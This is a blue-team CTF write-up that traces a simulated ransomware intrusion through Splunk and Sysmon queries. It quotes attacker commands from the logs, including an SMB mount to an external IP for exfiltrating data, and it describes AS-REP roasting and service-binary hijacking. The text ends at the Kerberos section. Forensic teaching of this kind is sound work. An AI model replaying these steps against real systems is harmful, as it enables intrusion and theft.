# RansomedTrust - Lynx Lab

<p align="center">
  <img src="image.png" alt="image.png">
</p>

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
  * [Architecture Diagram Summary](#architecture-diagram-summary)
- [Initial Access](#initial-access)
- [Discovery](#discovery)
- [Internal Phishing and Initial Execution](#internal-phishing-and-initial-execution)
- [Privilege Escalation](#privilege-escalation)
- [Credential Access](#credential-access)
  * [Detecting Kerberos Disabled Preauthentication](#detecting-kerberos-disabled-preauthentication)
  * [Detecting Kerberoasting Attacks](#detecting-kerberoasting-attacks)
- [Persistence](#persistence)
- [Cross Forest Pivot](#cross-forest-pivot)
- [Command and Control](#command-and-control)
- [Ransomware Deployment](#ransomware-deployment)
- [Static Malware Analysis](#static-malware-analysis)
- [Attack Chain](#attack-chain)
  * [Text Tree](#text-tree)
- [Artifacts](#artifacts)
- [Lab Insights](#lab-insights)

# Context

Lab link: [https://cyberdefenders.org/blueteam-ctf-challenges/ransomedtrust-lynx/](https://cyberdefenders.org/blueteam-ctf-challenges/ransomedtrust-lynx/)

Suggested tools: CyberChef, Splunk, IDA, CFF Explorer, PEStudio

Tactics: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Impact

# Scenario

On April 30, 2026, a multinational organization operating across two trusted Active Directory forests was paralyzed within hours. Encrypted files surfaced across workstations, file servers, and domain controllers; ransom notes flooded every shared folder; and a defaced desktop wallpaper appeared on every reachable system.

Initial triage uncovered a forgotten Linux development web server that had been public-facing and unpatched for years. The host carried a second network interface wired directly into the internal corporate network and sat completely outside the SIEM's monitoring scope, giving the attacker a silent bridge between the internet and the internal estate from which the rest of the intrusion was launched.

It is unclear how the attacker obtained the initial domain credentials used from that pivot, but evidence is consistent with an LLMNR / NBT-NS poisoning attack staged from the same Linux host. Note that legitimate users reach internal hosts through a sanctioned jump box at **`10.10.6.205`**; any interactive session originating elsewhere should be treated as anomalous.

You have been provided with Splunk telemetry from both forests and a copy of the recovered ransomware binary. Reconstruct the attack timeline from the first authentication anomaly to mass deployment, then statically analyze the binary to expose attacker tooling and the family lineage of the deployed payload.

![image.png](image%201.png)

## Architecture Diagram Summary

- Two internet-facing entry points, not one: BEACHHEAD (10.10.11.163, exposed RDP) and the Linux dev server (10.10.5.37, exposed + dual-homed) are both plausible initial-access vectors. Worth keeping both in play until telemetry tells you which one actually got hit first — don't assume it's the dev box just because the narrative foregrounds it.
- Jump box baseline gives you a clean anomaly filter: any interactive/RDP session into 10.10.11.x-range hosts not sourced from 10.10.6.205 is suspicious by definition — that includes sessions sourced from BEACHHEAD or the Linux box itself.
- Linux dev server is the seam: dual-homed, unmanaged, outside SIEM scope, sitting adjacent to WS-DEV01 — this is your dark spot. Anything that happens purely on/via that host won't show up in Splunk; you'll only see its effects (e.g. the LLMNR-poisoned auth landing on a domain host).
- Forest trust is a second blast-radius multiplier: corp.local → partner.local trust means once DA-equivalent creds or a trusted relationship is abused in corp.local, PART-DC01 is reachable too — that's probably why the scenario says "two forests," not just "two domains."
- ADCS CA on DC01 stands out — worth keeping in mind for privilege escalation (ESC-style certificate abuse is a common LYNX-adjacent tradecraft move if AD CS is misconfigured).

# Initial Access

**Q1**- The first hands-on RDP session into BEACHHEAD originated from inside the network. The successful logon record names both the source IP and the user account. Provide both.

Answer: `10.10.5.37`, `marketing01`

Reason: The first hands-on Remote Desktop Protocol (RDP) session into `BEACHHEAD` was established at `2026-04-30 09:17:51 UTC` from source IP `10.10.5.37`, the unmanaged, dual-homed Linux development server, authenticating as the `marketing01` account. This occurred well before the legitimate administrator RDP session from the sanctioned jump box, `10.10.6.205`, at `13:33:38`. Because `10.10.5.37` sits outside the approved jump-box path defined in the environment baseline, this session represents the first authentication anomaly in the intrusion and marks the pivot point from the internet-exposed Linux host into the internal Windows estate.

The technique aligns with T1021.001 (Remote Services: Remote Desktop Protocol) for the lateral movement vector, and T1078 (Valid Accounts) for the use of the `marketing01` credential to authenticate rather than exploiting a service vulnerability directly on `BEACHHEAD`.

```sql
index=* host="BEACHHEAD" source="WinEventLog:Security" EventCode=4624 Logon_Type=10
| table _time, src_ip, user
| sort _time

_time                  src_ip         user
2026-04-30 09:17:51    10.10.5.37     marketing01
2026-04-30 13:33:38    10.10.6.205    Administrator
```

**Q2**- After establishing the RDP foothold, compromised hosts repeatedly fetched offensive payloads from a single internet-facing staging server. What is its external IP address?

Answer: `52.58.62.68`

Reason: Following the RDP foothold on `BEACHHEAD`, `powershell.exe` repeatedly initiated outbound connections to a single external staging server at `52.58.62.68`, first observed at `09:44:12 UTC` on `2026-04-30` and recurring at roughly half-hour intervals thereafter. This pattern is consistent with the attacker pulling additional offensive tooling onto the compromised host via PowerShell rather than a one-time download, suggesting a staged or interactive tooling retrieval process.

```sql
index=* host="BEACHHEAD" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3 SourceIp=10.10.11.163 NOT (DestinationIp="*10.*" OR DestinationIp="*169*") NOT Image="*choco*"
|table _time, Image, SourceIp, DestinationIp

_time                  Image                                                          SourceIp        DestinationIp
2026-04-30 09:44:12    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     10.10.11.163    52.58.62.68
2026-04-30 10:17:01    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     10.10.11.163    52.58.62.68
2026-04-30 10:35:10    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     10.10.11.163    52.58.62.68
2026-04-30 11:07:34    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe     10.10.11.163    52.58.62.68
```

Current Process lineage using SPL parent/child lookups:

```sql
{B7417AB1-1E42-69F3-B10C-00000000BA03}  (RDP session shell)
└── powershell.exe  {B7417AB1-1E64-69F3-C80C-00000000BA03} # Main parent anchor so far
    └── powershell.exe  {B7417AB1-3CA9-69F3-D91A-00000000BA03}
        └── svchost.exe  {B7417AB1-3CAB-69F3-DC1A-00000000BA03}
            └── cmd.exe  {B7417AB1-3CAB-69F3-DE1A-00000000BA03}

{B7417AB1-59EA-69F3-3927-00000000BA03}  (RDP session shell)
└── powershell.exe (SysWOW64)  {B7417AB1-59EE-69F3-3D27-00000000BA03}
```

![image.png](image%202.png)

# Discovery

**Q3**- To map the full organization, the attacker enumerated forest trust relationships using a native Windows binary. What was the full command executed?

Answer: `"C:\Windows\system32\nltest.exe" /domain_trusts`

Reason: At `09:42:58 UTC` on `2026-04-30`, the attacker executed `C:\Windows\system32\nltest.exe` `/domain_trusts` on `BEACHHEAD` as `CORP\marketing01`, spawned directly from the same PowerShell process (`ProcessGuid {B7417AB1-1E64-69F3-C80C-00000000BA03}`) responsible for the ongoing Command and Control (C2) beacon loop. This confirms the discovery activity was performed interactively over the established C2 channel rather than through a separate access path. Sysmon natively flagged the event under `technique_id=T1482`, `technique_name=Domain Trust Discovery`.

```sql
index=* host="BEACHHEAD" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "nltest"

Image: C:\Windows\System32\nltest.exe
CommandLine: "C:\Windows\system32\nltest.exe" /domain_trusts
User: CORP\marketing01
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessGuid: {B7417AB1-1E64-69F3-C80C-00000000BA03}
UtcTime: 2026-04-30 09:42:58.746
```

Current process lineage:

```sql
{B7417AB1-1E42-69F3-B10C-00000000BA03}  (RDP session shell)
└── powershell.exe  {B7417AB1-1E64-69F3-C80C-00000000BA03} # Main parent anchor so far
    ├── nltest.exe  {B7417AB1-2422-69F3-7110-00000000BA03} # Current task
    └── powershell.exe  {B7417AB1-3CA9-69F3-D91A-00000000BA03}
        └── svchost.exe  {B7417AB1-3CAB-69F3-DC1A-00000000BA03}
            └── cmd.exe  {B7417AB1-3CAB-69F3-DE1A-00000000BA03}
```

**Q4**- Following the trust enumeration, the attacker collected Active Directory objects data into a timestamp-prefixed archive in a system temp directory. What is the full path of the file produced?

Answer: `C:\Windows\Temp\20260430101733_BloodHound.zip`

Reason: At `10:17:33 UTC` on `2026-04-30`, the attacker, operating as `marketing01` via `SharpHound.exe -c Default --outputdirectory C:\Windows\Temp\` spawned from the same beaconing PowerShell process, collected Active Directory (AD) objects into a timestamp-prefixed archive at `C:\Windows\Temp\20260430101733_BloodHound.zip`. This archive was built alongside individual raw JSON collection files covering users, groups, computers, domains, organizational units (OUs), and group policy objects (GPOs) that fed into it. This confirms BloodHound-style AD relationship mapping occurred immediately following the `nltest.exe` trust enumeration, extending the discovery phase from trust relationships to full object-level graph collection.

Current process lineage:

```sql
{B7417AB1-1E42-69F3-B10C-00000000BA03}  (RDP session shell)
└── powershell.exe  {B7417AB1-1E64-69F3-C80C-00000000BA03} # Main parent anchor so far
    ├── nltest.exe  {B7417AB1-2422-69F3-7110-00000000BA03}
    ├── SharpHound.exe  {B7417AB1-2C3C-69F3-DD13-00000000BA03} # Current task
    └── powershell.exe  {B7417AB1-3CA9-69F3-D91A-00000000BA03}
        └── svchost.exe  {B7417AB1-3CAB-69F3-DC1A-00000000BA03}
            └── cmd.exe  {B7417AB1-3CAB-69F3-DE1A-00000000BA03}
```

```sql
index=* host="BEACHHEAD" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentProcessGuid="{B7417AB1-1E64-69F3-C80C-00000000BA03}"
|table _time, Image, ProcessGuid, CommandLine

# Then pivot from this GUID {B7417AB1-2C3C-69F3-DD13-00000000BA03} to EID 11 (FileCreate)

index=* host="BEACHHEAD" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "{B7417AB1-2C3C-69F3-DD13-00000000BA03}"  EventCode=11
|table  _time, Image, ProcessGuid, TargetFilename, file_path
```

![image.png](image%203.png)

![image.png](image%204.png)

**Q5**- While exfiltrating the AD-collection archive over an external SMB share, the attacker leaked credentials in plaintext via the command line. What username:password pair was exposed?

Answer: `b4l3ri0n`:`Password123`

Reason: The attacker's first attempt to map the external SMB share at `10:18:29 UTC` on `2026-04-30`, `net use \\52.58.62.68:8888\share /user:b4l3ri0n Password123`, used invalid UNC syntax, since Windows UNC paths do not support an appended port and SMB negotiates over `TCP/445` only. The failed attempt was followed 23 seconds later by a diagnostic `PING.EXE 52.58.62.68`, suggesting the failure prompted a connectivity check before retrying. The corrected command, `C:\Windows\system32\net.exe` `use \\52.58.62.68\share /user:b4l3ri0n Password123`, with the port removed, was then retried three times at `10:21:07`, `10:23:21`, and `10:28:40`, again exposing the plaintext credential pair `b4l3ri0n:Password123` used to mount the share for exfiltrating the AD-collection archive.

Current process lineage:

```sql
{B7417AB1-1E42-69F3-B10C-00000000BA03}  (RDP session shell)
└── powershell.exe  {B7417AB1-1E64-69F3-C80C-00000000BA03} # Main parent anchor so far
    ├── nltest.exe  {B7417AB1-2422-69F3-7110-00000000BA03}
    ├── SharpHound.exe  {B7417AB1-2C3C-69F3-DD13-00000000BA03}
    ├── net.exe (invalid UNC port syntax)  {B7417AB1-2C75-69F3-F613-00000000BA03} # Current task, failed usage
    ├── PING.EXE  {B7417AB1-2C8C-69F3-0514-00000000BA03}
    ├── net.exe  {B7417AB1-2D13-69F3-3E14-00000000BA03} # Current task
    ├── net.exe  {B7417AB1-2D99-69F3-7514-00000000BA03} # Current task
    ├── net.exe  {B7417AB1-2ED8-69F3-FF14-00000000BA03} # Current task
    └── powershell.exe  {B7417AB1-3CA9-69F3-D91A-00000000BA03}
        └── svchost.exe  {B7417AB1-3CAB-69F3-DC1A-00000000BA03}
            └── cmd.exe  {B7417AB1-3CAB-69F3-DE1A-00000000BA03}
```

```sql
index=* host="BEACHHEAD" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentProcessGuid="{B7417AB1-1E64-69F3-C80C-00000000BA03}"
|table _time, Image, ProcessGuid, CommandLine
```

![image.png](image%205.png)

# Internal Phishing and Initial Execution

**Q6**- With share-write access confirmed during enumeration, the attacker dropped a macro-enabled Office document on a file server share to phish an internal user. What is the filename?

Answer: `Q1-HR-Policy-Update.docm`

Reason: At `10:35:09 UTC` on `2026-04-30`, the attacker's root beaconing PowerShell process (`ProcessGuid {B7417AB1-1E64-69F3-C80C-00000000BA03}`) staged the macro-enabled document `Q1-HR-Policy-Update.docm` locally on `BEACHHEAD` at `C:\Users\marketing01\`. Roughly three minutes later, at `10:38:23`, an identically-named file appeared on `FILESVR01`'s public share at `C:\Shares\PUBLIC\Q1-HR-Policy-Update.docm`, logged there under the `System` process since it arrived via an inbound SMB write from `BEACHHEAD` rather than local execution. This confirms the document was pushed from the compromised beachhead host onto the file server share to phish an internal user.

Current process lineage:

```sql
BEACHHEAD.corp.local
{B7417AB1-1E42-69F3-B10C-00000000BA03}  (RDP session shell)
└── powershell.exe  {B7417AB1-1E64-69F3-C80C-00000000BA03}  # Main parent anchor so far, and current task

FILESVR01.corp.local
{C7E5F579-02A2-69F3-EB03-000000000000}  (System — inbound SMB write, no local parent)
```

```sql
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "Q1-HR-Policy-Update.docm"
|table _time, ProcessGuid, Image, EventID, Computer, TargetFilename, CommandLine

BEACHHEAD.corp.local   10:35:09  {B7417AB1-1E64-69F3-C80C-00000000BA03}  powershell.exe  -> C:\Users\marketing01\Q1-HR-Policy-Update.docm
FILESVR01.corp.local   10:38:23  {C7E5F579-02A2-69F3-EB03-000000000000}  System          -> C:\Shares\PUBLIC\Q1-HR-Policy-Update.docm
```

![image.png](image%206.png)

**Q7**- A user opened the staged phishing document, triggering a macro that dropped and executed a binary in the user's profile. Provide the user, host, and full path of the dropped executable.

Answer: `jsmith`, `WS-HR01`, `C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe`

Reason: At `11:17:09 UTC` on `2026-04-30`, user `jsmith` on host `WS-HR01` opened the phishing document via `WINWORD.EXE` `/n "\\Filesvr01\hr\Q1-HR-Policy-Update.docm"`. The embedded macro, executing within `WINWORD.EXE`'s own process context, wrote the payload to `C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe` at `11:17:27` (Event ID 11, `Image=WINWORD.EXE`), then executed it two seconds later at `11:17:29` as a child process (Event ID 1, `ParentImage=WINWORD.EXE`). This provides direct Sysmon evidence of both the drop and execution stages of the macro's payload.

Current process lineage:

```sql
WS-HR01.corp.local
WINWORD.EXE  {c73af8d8-3a35-69f3-f914-000000005800}
└── rad125F4.tmp.exe  {c73af8d8-3a49-69f3-0515-000000005800}
```

```sql
# SPL
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "Q1-HR-Policy-Update.docm"
|table _time, Image, ProcessGuid, CommandLine, Computer

2026-04-30 11:17:09	C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE	{c73af8d8-3a35-69f3-f914-000000005800}	"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "\\Filesvr01\hr\Q1-HR-Policy-Update.docm" /o ""	WS-HR01.corp.local

# Now using {c73af8d8-3a35-69f3-f914-000000005800} as parentguid, EID 11:
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentProcessGuid="{c73af8d8-3a35-69f3-f914-000000005800}"
|table _time, Image, ProcessGuid, CommandLine, Computer

2026-04-30 11:17:27	C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE	{c73af8d8-3a35-69f3-f914-000000005800}	C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe
```

```bash
# Result
User: jsmith
Host: WS-HR01.corp.local
Drop:    EventID 11, 2026-04-30 11:17:27.632, Image=WINWORD.EXE     {c73af8d8-3a35-69f3-f914-000000005800} -> TargetFilename=C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe
Execute: EventID 1,  2026-04-30 11:17:29,     ParentImage=WINWORD.EXE {c73af8d8-3a35-69f3-f914-000000005800} -> Image=rad125F4.tmp.exe {c73af8d8-3a49-69f3-0515-000000005800}
```

# Privilege Escalation

**Q8**- From the foothold on the compromised workstation, the threat actor dropped and executed a privilege-escalation enumeration tool that was placed in the user's profile directory. Identify the full file path.

Answer: `C:\Users\jsmith\winPEASx64.exe`

Reason: The threat actor dropped and executed `winPEASx64.exe` from `C:\Users\jsmith\` on `WS-HR01`, reached via a process chain originating from the macro-dropped payload. `rad125F4.tmp.exe` (`11:17:29`) spawned `cmd.exe` (`11:17:38`, also the target of an Event ID 10 access from `rad125F4.tmp.exe` moments earlier), which spawned `powershell.exe` (`11:19:11`), which in turn wrote and launched `winPEASx64.exe` at `11:25:38`. `winPEASx64.exe` is a privilege-escalation enumeration tool used to survey the compromised workstation for local misconfigurations.

Current process lineage:

```sql
WS-HR01.corp.local
WINWORD.EXE  {c73af8d8-3a35-69f3-f914-000000005800}
└── rad125F4.tmp.exe  {c73af8d8-3a49-69f3-0515-000000005800}
    └── cmd.exe  {c73af8d8-3a52-69f3-0f15-000000005800}
        └── powershell.exe  {c73af8d8-3aaf-69f3-1d15-000000005800}
            └── winPEASx64.exe {c73af8d8-3c50-69f3-7915-000000005800} # EID 11, dropped and current task
```

```bash
# Full chain backwards from winPEAS

# Final SPL backwards to the root rad* executable
index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ProcessGuid="{c73af8d8-3a49-69f3-0515-000000005800}"
|table _time, Image, ProcessGuid, ParentProcessGuid, CommandLine, EventID

User: jsmith
Host: WS-HR01.corp.local
Full path: C:\Users\jsmith\winPEASx64.exe
Chain:
WINWORD.EXE {3a35}
|-- rad125F4.tmp.exe {3a49}  (11:17:29)
    |-- cmd.exe {3a52}  (11:17:38)
        |-- powershell.exe {3aaf}  (11:19:11)
            |-- winPEASx64.exe  (11:25:38, EID 11 FileCreate)

index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "winPEASx64.exe" EventID=11
| table _time, Image, ProcessGuid, ParentProcessGuid, CommandLine, EventID
->
_time                   Image                                                              ProcessGuid                                ParentProcessGuid  CommandLine  EventID
2026-04-30 11:25:38     C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe            {c73af8d8-3aaf-69f3-1d15-000000005800}                                     11

index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ProcessGuid="{c73af8d8-3aaf-69f3-1d15-000000005800}"
| table _time, Image, ProcessGuid, ParentProcessGuid, CommandLine, EventID
->
_time                   Image                                                              ProcessGuid                                ParentProcessGuid                          CommandLine  EventID
2026-04-30 11:19:11     C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe            {c73af8d8-3aaf-69f3-1d15-000000005800}     {c73af8d8-3a52-69f3-0f15-000000005800}     powershell   1

index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ProcessGuid="{c73af8d8-3a52-69f3-0f15-000000005800}"
| table _time, Image, ProcessGuid, ParentProcessGuid, CommandLine, EventID
->
_time                   Image                              ProcessGuid                                ParentProcessGuid                          CommandLine                        EventID
2026-04-30 11:17:38     C:\Windows\SysWOW64\cmd.exe          {c73af8d8-3a52-69f3-0f15-000000005800}     {c73af8d8-3a49-69f3-0515-000000005800}     C:\Windows\system32\cmd.exe          1

index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ProcessGuid="{c73af8d8-3a49-69f3-0515-000000005800}"
| table _time, Image, ProcessGuid, ParentProcessGuid, CommandLine, EventID
->
_time                   Image                                                             ProcessGuid                                ParentProcessGuid                          CommandLine                                                  EventID
2026-04-30 11:17:29     C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe                 {c73af8d8-3a49-69f3-0515-000000005800}     {c73af8d8-3a35-69f3-f914-000000005800}     "C:\Users\jsmith\AppData\Local\Temp\rad125F4.tmp.exe"       1
```

**Q9**- What DNS resolver did the host use during the download of the privilege escalation tool? And what destination IP did the privilege escalation tool contact?

Answer: `1.1.1.1`, `18.64.211.110`

Reason: During the execution of `winPEASx64.exe` on `WS-HR01`, the tool queried DNS via `1.1.1.1` at `11:27:41 UTC`, bypassing the internal AD-integrated resolver, a defense-evasion-adjacent behavior. One second later, at `11:27:42`, it made an outbound connection to `18.64.211.110`, alongside a connection to `10.10.11.57` (`CORP-DC02`), consistent with `winPEAS`'s normal internal AD and domain enumeration checks.

Current process lineage:

```sql
WS-HR01.corp.local
WINWORD.EXE  {c73af8d8-3a35-69f3-f914-000000005800}
└── rad125F4.tmp.exe  {c73af8d8-3a49-69f3-0515-000000005800}
    └── cmd.exe  {c73af8d8-3a52-69f3-0f15-000000005800}
        └── powershell.exe  {c73af8d8-3aaf-69f3-1d15-000000005800} # EID dropped below binary
            └── winPEASx64.exe {c73af8d8-3c50-69f3-7915-000000005800} # Current task
```

```bash
index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3 ProcessGuid="{c73af8d8-3c50-69f3-7915-000000005800}" NOT "*169*"
| table _time, Image, ProcessGuid, DestinationIp
->
_time                   Image                              ProcessGuid                                DestinationIp
2026-04-30 11:27:41     C:\Users\jsmith\winPEASx64.exe       {c73af8d8-3c50-69f3-7915-000000005800}     1.1.1.1
2026-04-30 11:27:42     C:\Users\jsmith\winPEASx64.exe       {c73af8d8-3c50-69f3-7915-000000005800}     18.64.211.110
2026-04-30 11:27:42     C:\Users\jsmith\winPEASx64.exe       {c73af8d8-3c50-69f3-7915-000000005800}     10.10.11.57
```

![image.png](image%207.png)

**Q10**- The enumeration tool flagged a writable service binary, which the attacker overwrote to obtain a `SYSTEM` shell. Provide the malicious binary path which dropped in the user's profile to replace service binary. and the original service path.

Answer: `C:\Users\jsmith\vulnsvc_system.exe`, `C:\Tools\VulnSvc.exe`

Reason: After `winPEASx64.exe` flagged `C:\Tools\VulnSvc.exe` as a writable service binary, confirmed via `icacls C:\Tools\VulnSvc.exe` at `11:32:15`, the attacker's follow-on PowerShell session (`ProcessGuid {c73af8d8-3e50-69f3-d715-000000005800}`) staged a malicious replacement at `C:\Users\jsmith\vulnsvc_system.exe`, written at `11:34:43` and again at `11:34:54`, before overwriting the original service binary at `C:\Tools\VulnSvc.exe` at `11:35:16`. This enables the service to execute attacker-controlled code with `SYSTEM` privileges on the next start or restart.

Current process lineage:

```sql
WS-HR01.corp.local

WINWORD.EXE  {c73af8d8-3a35-69f3-f914-000000005800}
└── rad125F4.tmp.exe  {c73af8d8-3a49-69f3-0515-000000005800}
    └── cmd.exe  {c73af8d8-3a52-69f3-0f15-000000005800}
        ├── powershell.exe  {c73af8d8-3aaf-69f3-1d15-000000005800}
        │   └── winPEASx64.exe  {c73af8d8-3c50-69f3-7915-000000005800}
        ├── icacls.exe  {c73af8d8-3dbf-69f3-bb15-000000005800}
        │   ← "icacls C:\Tools\VulnSvc.exe" (11:32:15, flagged writable service binary)
        └── powershell.exe  {c73af8d8-3e50-69f3-d715-000000005800}
            ← wrote C:\Users\jsmith\vulnsvc_system.exe (11:34:43, 11:34:54)
            ← overwrote C:\Tools\VulnSvc.exe (11:35:16)
```

```bash
index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ParentProcessGuid="{c73af8d8-3a52-69f3-0f15-000000005800}"
|table _time, Image, ProcessGuid, ParentImage, ParentProcessGuid, CommandLine
->
1	2026-04-30 11:34:40	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	{c73af8d8-3e50-69f3-d715-000000005800}	C:\Windows\SysWOW64\cmd.exe	{c73af8d8-3a52-69f3-0f15-000000005800}	powershell
2	2026-04-30 11:32:15	C:\Windows\SysWOW64\icacls.exe	{c73af8d8-3dbf-69f3-bb15-000000005800}	C:\Windows\SysWOW64\cmd.exe	{c73af8d8-3a52-69f3-0f15-000000005800}	icacls  C:\Tools\VulnSvc.exe <- vuln service name revealed before it was renamed

Using the spwaned powershell processguid from above:
index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" ProcessGuid="{c73af8d8-3e50-69f3-d715-000000005800}" EventID=11
|table _time, Image, ProcessGuid, Image, TargetFilename
-> 
	_time	Image	ProcessGuid	TargetFilename
1	2026-04-30 11:35:16	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	{c73af8d8-3e50-69f3-d715-000000005800}	C:\Tools\VulnSvc.exe
2	2026-04-30 11:34:54	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	{c73af8d8-3e50-69f3-d715-000000005800}	C:\Users\jsmith\vulnsvc_system.exe
3	2026-04-30 11:34:43	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	{c73af8d8-3e50-69f3-d715-000000005800}	C:\Users\jsmith\vulnsvc_system.exe

# Summary for this task
Malicious binary (staged): C:\Users\jsmith\vulnsvc_system.exe
Original service binary:   C:\Tools\VulnSvc.exe

11:32:15   icacls.exe                    C:\Tools\VulnSvc.exe                  (permissions check)
11:34:43   powershell.exe {3e50}    ->   C:\Users\jsmith\vulnsvc_system.exe    (FileCreate)
11:34:54   powershell.exe {3e50}    ->   C:\Users\jsmith\vulnsvc_system.exe    (FileCreate/overwrite)
11:35:16   powershell.exe {3e50}    ->   C:\Tools\VulnSvc.exe                  (overwrite of service binary)
```

# Credential Access

**Q11**- With `SYSTEM` achieved, the attacker dumped LSASS memory and recovered a high-privilege domain account's password in cleartext, then validated it via an inbound logon to the domain controller. What is the username?

Answer: `helpdesk01`

Reason: Having achieved `SYSTEM` via the overwritten service binary, the attacker's malicious `VulnSvc.exe` process directly accessed `lsass.exe` at `11:39:47 UTC` on `2026-04-30` (Sysmon Event ID 10, `GrantedAccess 0x1010`, tagged T1003 Credential Dumping) to dump credentials in-memory with no on-disk artifact produced. This is consistent with a custom in-process dumping capability rather than a separate tool such as Mimikatz. Roughly 38 minutes later, at `12:18:00`, the recovered high-privilege domain account `helpdesk01` was used to authenticate to `DC01` via Kerberos (`Logon_Type 3`) from `WS-HR01` (`10.10.11.8`), validating the cleartext credential. This delay is consistent with the attacker offline-parsing the LSASS dump before testing the recovered password.

```sql
index=* host="WS-HR01" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "lsass.exe" EventID=10
|table _time, Image, ProcessGuid, Image, TargetFilename

		<Data Name='RuleName'>technique_id=T1003,technique_name=Credential Dumping</Data>
		<Data Name='UtcTime'>2026-04-30 11:39:47.851</Data>
		<Data Name='SourceProcessGUID'>{c73af8d8-3f6d-69f3-f815-000000005800}</Data>
		<Data Name='SourceProcessId'>9528</Data>
		<Data Name='SourceThreadId'>13508</Data>
		<Data Name='SourceImage'>C:\Tools\VulnSvc.exe</Data>
		<Data Name='TargetProcessGUID'>{c73af8d8-04a7-69f3-0c00-000000005800}</Data>
		<Data Name='TargetProcessId'>684</Data>
		<Data Name='TargetImage'>C:\Windows\system32\lsass.exe</Data>
		<Data Name='GrantedAccess'>0x1010</Data>
		<Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9da64|C:\Windows\System32\KERNELBASE.dll+28d3e|UNKNOWN(00000000017CB136)</Data>
		<Data Name='SourceUser'>NT AUTHORITY\SYSTEM</Data>
		<Data Name='TargetUser'>NT AUTHORITY\SYSTEM</Data>
		
index=* host="DC01" EventCode=4624 src_ip="10.10.11.8" ElevatedToken="%%1842" AuthenticationPackageName=Kerberos NOT ("*$*")
|table _time, src_ip, Logon_Type, TargetUserName

30	2026-04-30 12:45:17	10.10.11.8	3	Administrator
31	2026-04-30 12:45:17	10.10.11.8	3	Administrator
32	2026-04-30 12:45:17	10.10.11.8	3	Administrator
33	2026-04-30 12:18:00	10.10.11.8	3	Administrator
34	2026-04-30 12:18:00	10.10.11.8	3	helpdesk01 # Compromised admin user
35	2026-04-30 12:17:59	10.10.11.8	3	jsmith
36	2026-04-30 11:26:57	10.10.11.8	3	jsmith
37	2026-04-30 11:26:55	10.10.11.8	3	jsmith

```

**Q12**- Continuing credential-access activity, the attacker identified a domain account with Kerberos pre-authentication disabled. What is the username?

Answer: `jsmith`

Reason: Querying `EventCode=4768` (Kerberos TGT request) for `PreAuthType=0` on successful requests reveals that the domain account `jsmith` repeatedly obtained Ticket Granting Tickets (TGTs) without Kerberos pre-authentication throughout the intrusion timeline (`10:39` to `12:14 UTC`). This confirms the account has "Do not require Kerberos preauthentication" enabled, a misconfiguration that makes it vulnerable to offline AS-REP roasting, since anyone can request a TGT for this account and attempt to crack the returned encrypted ticket without needing valid credentials first. This maps to T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting) for the exploitation of the disabled pre-authentication requirement.

```sql
index=* EventCode=4768 PreAuthType=0
|table _time, host, action, ServiceName, TargetUserName
```

![image.png](image%208.png)

## Detecting Kerberos Disabled Preauthentication

**Also known as: AS-REP Roasting Exposure**

Kerberos pre-authentication exists to close a specific gap in the original protocol design. Without it, any client can send an `AS-REQ` (Authentication Service Request) naming any username, and the Key Distribution Center (KDC) will happily return a Ticket Granting Ticket (TGT) encrypted with that user's password-derived key, no proof of password knowledge required. Pre-authentication was introduced specifically to close this hole: the client must first prove it knows the password by encrypting a timestamp with a key derived from it (`PA-ENC-TIMESTAMP`, `PreAuthType 2`) before the KDC will issue anything. When an account has the User Account Control (UAC) flag "Do not require Kerberos preauthentication" set (`UF_DONT_REQUIRE_PREAUTH`, bit `0x400000` in `userAccountControl`), this proof step is skipped entirely for that account. The KDC issues a TGT to anyone who asks, no password required at request time. That TGT is encrypted with a key derived from the account's actual password, so an attacker can take it offline and brute-force or dictionary-attack the encryption key with tools like Hashcat or John the Ripper, with zero interaction against the domain after the initial request. This is AS-REP Roasting.

**Mechanism**

